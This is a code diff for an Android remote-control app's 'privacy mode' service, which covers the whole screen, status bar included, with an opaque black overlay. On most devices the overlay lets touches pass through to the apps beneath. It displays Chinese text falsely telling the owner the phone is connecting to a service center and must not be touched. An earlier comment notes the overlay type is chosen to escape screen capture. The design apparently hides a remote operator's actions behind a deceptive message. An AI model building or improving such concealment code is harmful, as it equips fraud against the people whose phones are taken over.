@@ -15,7 +15,9 @@ import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import android.view.Gravity
+import android.view.View
 import android.view.WindowManager
+import android.widget.FrameLayout
 import android.widget.TextView
 import android.widget.Toast
 import android.net.Uri
@@ -88,7 +90,7 @@ class PrivacyModeService : Service() {
         }
     }
     
-    private var privacyView: TextView? = null
+    private var overlayView: View? = null
     private var windowManager: WindowManager? = null
     private var notificationManager: NotificationManager? = null
     
@@ -204,7 +206,7 @@ class PrivacyModeService : Service() {
         Log.d(TAG, "onDestroy called")
         
         // Remove black overlay
-        privacyView?.let { view ->
+        overlayView?.let { view ->
             try {
                 windowManager?.removeView(view)
                 Log.d(TAG, "Privacy overlay removed")
@@ -212,7 +214,7 @@ class PrivacyModeService : Service() {
                 Log.e(TAG, "Error removing privacy view", e)
             }
         }
-        privacyView = null
+        overlayView = null
         windowManager = null
         
         // Mark as inactive
@@ -263,7 +265,7 @@ class PrivacyModeService : Service() {
         windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
         
         // Remove any existing view first (prevent memory leak)
-        privacyView?.let { view ->
+        overlayView?.let { view ->
             try {
                 windowManager?.removeView(view)
             } catch (e: Exception) {
@@ -274,68 +276,47 @@ class PrivacyModeService : Service() {
         // Detect device type for vendor-specific handling
         val deviceType = detectDeviceType()
         
-        // Create black overlay view with warning text
-        // Use solid black color - Color.BLACK is #FF000000 (fully opaque)
-        privacyView = TextView(this).apply {
-            // Use multiple layers to ensure complete opacity on EMUI/HarmonyOS
-            setBackgroundColor(Color.BLACK) // #FF000000 - Pure solid black
-            // Set alpha to ensure no transparency
-            alpha = 1.0f
-            text = "系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
-            setTextColor(Color.WHITE)
-            textSize = 28f
-            gravity = Gravity.CENTER
+        // Create a FrameLayout container for better control and opacity
+        val container = FrameLayout(this).apply {
+            // Set opaque black background - use solid color
+            setBackgroundColor(Color.BLACK)
             
-            // Set solid black background drawable for extra opacity assurance
-            background = android.graphics.drawable.ColorDrawable(Color.BLACK)
-            
-            // Hide system UI (navigation bar and status bar) to ensure full screen coverage
-            @Suppress("DEPRECATION")
-            systemUiVisibility = (
-                android.view.View.SYSTEM_UI_FLAG_LAYOUT_STABLE or
-                android.view.View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or
-                android.view.View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
-                android.view.View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
-                android.view.View.SYSTEM_UI_FLAG_FULLSCREEN or
-                android.view.View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
-            )
-            
-            // For Android 11+, use WindowInsetsController
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                setOnApplyWindowInsetsListener { view, insets ->
-                    // Consume all insets to ensure we draw over system bars
-                    insets
-                }
+            // Create TextView for message
+            val textView = TextView(this@PrivacyModeService).apply {
+                text = "系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
+                setTextColor(Color.WHITE)
+                textSize = 28f
+                gravity = Gravity.CENTER
+                // Text on transparent background, container handles the black
+                setBackgroundColor(Color.TRANSPARENT)
             }
+            
+            // Add text view centered in container
+            val textParams = FrameLayout.LayoutParams(
+                FrameLayout.LayoutParams.WRAP_CONTENT,
+                FrameLayout.LayoutParams.WRAP_CONTENT,
+                Gravity.CENTER
+            )
+            addView(textView, textParams)
+            
+            // Additional black layer for extra opacity (belt and suspenders approach)
+            val blackLayer = View(this@PrivacyModeService).apply {
+                setBackgroundColor(Color.BLACK)
+            }
+            val blackLayerParams = FrameLayout.LayoutParams(
+                FrameLayout.LayoutParams.MATCH_PARENT,
+                FrameLayout.LayoutParams.MATCH_PARENT
+            )
+            addView(blackLayer, 0, blackLayerParams) // Add at index 0 (behind text)
         }
         
-        // Get screen dimensions - use Point for more reliable size
+        // Get screen dimensions
         val display = windowManager?.defaultDisplay
         val screenSize = android.graphics.Point()
         display?.getRealSize(screenSize)
         val screenWidth = screenSize.x
         val screenHeight = screenSize.y
         Log.d(TAG, "DEBUG_PRIVACY: Screen size: ${screenWidth}x${screenHeight}")
-        
-        // Use MUCH larger dimensions to guarantee full coverage including status bar, nav bar, and curved edges
-        // Increase padding significantly for curved screen devices and EMUI/HarmonyOS status bar issues
-        val overlayWidth = screenWidth + 1000  // Extra padding for curved edges
-        val overlayHeight = screenHeight + 1000  // Extra padding for status bar, nav bar, and notch
-        
-        // Build window flags - enhanced for better coverage on Huawei/Honor devices
-        // These flags ensure the overlay draws over system UI elements
-        @Suppress("DEPRECATION")
-        val windowFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or  // Allow touches to pass through
-                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or  // Draw beyond screen boundaries
-                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
-                WindowManager.LayoutParams.FLAG_FULLSCREEN or
-                WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR or  // Cover inset areas
-                WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS or // Cover system bars
-                WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS or  // Draw over status bar
-                WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION  // Draw over navigation bar
-        
-        Log.d(TAG, "DEBUG_PRIVACY: Window flags: $windowFlags")
         
         // Determine window types to try based on device type
         val windowTypesToTry = getWindowTypesForDevice(deviceType)
@@ -349,38 +330,36 @@ class PrivacyModeService : Service() {
             val typeName = getWindowTypeName(windowType)
             Log.d(TAG, "DEBUG_PRIVACY: Trying window type: $typeName")
             
+            // Build window flags based on device type
+            val windowFlags = buildWindowFlags(deviceType)
+            Log.d(TAG, "DEBUG_PRIVACY: Window flags: $windowFlags")
+            
+            // Use larger dimensions for edge coverage
+            val overlayWidth = screenWidth + 600
+            val overlayHeight = screenHeight + 600
+            
             val params = WindowManager.LayoutParams(
                 overlayWidth,
                 overlayHeight,
                 windowType,
                 windowFlags,
-                PixelFormat.OPAQUE
+                PixelFormat.OPAQUE  // Critical: ensures no transparency
             ).apply {
-                // Position with negative offset to cover status bar (top) and edges
-                // Increased negative offset for better status bar coverage on Huawei/Honor
                 gravity = Gravity.TOP or Gravity.START
-                x = -500  // Offset to ensure left edge and curved edge coverage
-                y = -500  // Large negative to cover status bar and any notch
+                x = -300  // Offset to center the extra width
+                y = -300  // Offset to cover status bar
                 
                 // Support for notch/cutout displays (Android P+)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                    layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_ALWAYS
-                }
-                
-                // Set dimAmount to ensure no transparency issues
-                dimAmount = 1.0f
-                
-                // For EMUI/HarmonyOS, ensure we're above status bar
-                if (deviceType == DeviceType.HUAWEI_HONOR) {
-                    // Extend even further up for status bar coverage
-                    y = -600
+                    layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                 }
             }
             
             try {
-                windowManager?.addView(privacyView, params)
+                windowManager?.addView(container, params)
                 Log.d(TAG, "DEBUG_PRIVACY: SUCCESS - Overlay added with $typeName")
                 success = true
+                overlayView = container
             } catch (e: Exception) {
                 Log.w(TAG, "DEBUG_PRIVACY: Failed with $typeName: ${e.message}")
                 lastException = e
@@ -394,12 +373,37 @@ class PrivacyModeService : Service() {
     }
     
     /**
+     * Build window flags based on device type
+     */
+    @Suppress("DEPRECATION")
+    private fun buildWindowFlags(deviceType: DeviceType): Int {
+        return when (deviceType) {
+            DeviceType.HUAWEI_HONOR -> {
+                // Simpler flags for Huawei/Honor - some complex flags cause issues
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                WindowManager.LayoutParams.FLAG_FULLSCREEN
+            }
+            else -> {
+                // Standard flags for other devices
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                WindowManager.LayoutParams.FLAG_FULLSCREEN or
+                WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR or
+                WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS
+            }
+        }
+    }
+    
+    /**
      * Get ordered list of window types to try based on device type
      */
     private fun getWindowTypesForDevice(deviceType: DeviceType): List<Int> {
         return when (deviceType) {
             DeviceType.OPPO_COLOROS -> {
-                // OPPO/ColorOS: TYPE_APPLICATION_OVERLAY works better
                 Log.d(TAG, "DEBUG_PRIVACY: Using OPPO/ColorOS window type strategy")
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     listOf(
@@ -412,34 +416,22 @@ class PrivacyModeService : Service() {
                 }
             }
             DeviceType.HUAWEI_HONOR -> {
-                // Huawei/Honor: Use TYPE_SYSTEM_ERROR for highest z-order to cover status bar
-                // Then fall back to accessibility and application overlays
-                Log.d(TAG, "DEBUG_PRIVACY: Using HUAWEI/HONOR window type strategy (enhanced for status bar)")
+                // Huawei/Honor: TYPE_APPLICATION_OVERLAY is most reliable
+                Log.d(TAG, "DEBUG_PRIVACY: Using HUAWEI/HONOR window type strategy")
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    @Suppress("DEPRECATION")
                     listOf(
-                        WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,  // Highest z-order, covers everything
-                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY, // Also high z-order
-                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
-                    )
-                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
-                    @Suppress("DEPRECATION")
-                    listOf(
-                        WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,
-                        WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
+                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                         WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                     )
                 } else {
                     @Suppress("DEPRECATION")
                     listOf(
-                        WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,
-                        WindowManager.LayoutParams.TYPE_PHONE
+                        WindowManager.LayoutParams.TYPE_PHONE,
+                        WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                     )
                 }
             }
             DeviceType.XIAOMI_MIUI -> {
-                // Xiaomi/MIUI: Similar to generic, accessibility preferred
                 Log.d(TAG, "DEBUG_PRIVACY: Using XIAOMI/MIUI window type strategy")
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     listOf(
@@ -454,7 +446,6 @@ class PrivacyModeService : Service() {
                 }
             }
             DeviceType.GENERIC -> {
-                // Generic devices: TYPE_ACCESSIBILITY_OVERLAY preferred (not captured by MediaProjection)
                 Log.d(TAG, "DEBUG_PRIVACY: Using GENERIC window type strategy")
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -491,18 +482,8 @@ class PrivacyModeService : Service() {
     }
     
     /**
-     * Notify user about missing overlay permission
+     * Show notification prompting user to grant overlay permission
      */
-    private fun notifyPermissionError() {
-        Handler(Looper.getMainLooper()).post {
-            MainActivity.flutterMethodChannel?.invokeMethod("msgbox", mapOf(
-                "type" to "error",
-                "title" to "Permission Required",
-                "text" to "Please grant 'Display over other apps' permission to use privacy mode"
-            ))
-        }
-    }
-
     private fun showPermissionNotification() {
         val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         
